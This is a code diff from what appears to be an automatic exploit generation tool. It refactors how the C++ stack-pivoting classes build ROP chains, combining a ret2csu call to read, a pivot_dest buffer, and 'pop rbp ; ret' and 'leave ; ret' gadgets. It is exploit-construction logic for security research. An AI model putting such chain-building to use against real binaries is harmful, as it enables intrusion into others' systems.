@@ -54,8 +54,6 @@ BasicStackPivoting::BasicStackPivoting() : StackPivoting() {
 
 
 std::vector<RopSubchain> BasicStackPivoting::getRopSubchains() const {
-    using BaseType = BaseOffsetExpr::BaseType;
-
     const Exploit &exploit = g_crax->getExploit();
     const ELF &elf = exploit.getElf();
 
@@ -72,14 +70,14 @@ std::vector<RopSubchain> BasicStackPivoting::getRopSubchains() const {
     RopSubchain part2 = ret2csu->getRopSubchains(
         BaseOffsetExpr::create<BaseType::SYM>(elf, "read"),
         ConstantExpr::create(0, Expr::Int64),
-        BaseOffsetExpr::create(exploit, elf, "pivot_dest"),
+        BaseOffsetExpr::create<BaseType::VAR>(elf, "pivot_dest"),
         ConstantExpr::create(1024, Expr::Int64))[0];
 
     // Perform stack pivoting.
     RopSubchain part3 = {
-        BaseOffsetExpr::create(exploit, elf, Exploit::toVarName("pop rbp ; ret")),
-        BaseOffsetExpr::create(exploit, elf, "pivot_dest"),
-        BaseOffsetExpr::create(exploit, elf, Exploit::toVarName("leave ; ret"))
+        BaseOffsetExpr::create<BaseType::VAR>(elf, Exploit::toVarName("pop rbp ; ret")),
+        BaseOffsetExpr::create<BaseType::VAR>(elf, "pivot_dest"),
+        BaseOffsetExpr::create<BaseType::VAR>(elf, Exploit::toVarName("leave ; ret"))
     };
 
     RopSubchain ret;
@@ -128,8 +126,6 @@ bool AdvancedStackPivoting::checkRequirements() const {
 }
 
 std::vector<RopSubchain> AdvancedStackPivoting::getRopSubchains() const {
-    using BaseType = BaseOffsetExpr::BaseType;
-
     assert(m_readCallSites.size() &&
            "AdvancedStackPivoting requires at least one call site of read@libc");
 
@@ -147,13 +143,11 @@ std::vector<RopSubchain> AdvancedStackPivoting::getRopSubchains() const {
     // ret2csu once.
     RopSubchain part1;
     for (size_t i = 0; i < 6; i++) {
-        ref<Expr> e0
-            = BaseOffsetExpr::create(exploit,
-                                     elf,
-                                     Exploit::toVarName("pop rsi ; pop r15 ; ret"));
+        ref<Expr> e0 = BaseOffsetExpr::create<BaseType::VAR>(
+                elf, Exploit::toVarName("pop rsi ; pop r15 ; ret"));
 
         ref<Expr> e1 = AddExpr::alloc(
-                BaseOffsetExpr::create(exploit, elf, "pivot_dest"),
+                BaseOffsetExpr::create<BaseType::VAR>(elf, "pivot_dest"),
                 AddExpr::alloc(
                         ConstantExpr::create(8, Expr::Int64),
                         MulExpr::alloc(
@@ -185,7 +179,7 @@ std::vector<RopSubchain> AdvancedStackPivoting::getRopSubchains() const {
             BaseOffsetExpr::create<BaseType::SYM>(elf, "read"),
             ConstantExpr::create(0, Expr::Int64),
             AddExpr::alloc(
-                    BaseOffsetExpr::create(exploit, elf, "pivot_dest"),
+                    BaseOffsetExpr::create<BaseType::VAR>(elf, "pivot_dest"),
                     MulExpr::alloc(
                             ConstantExpr::create(0x30, Expr::Int64),
                             ConstantExpr::create(7, Expr::Int64))),
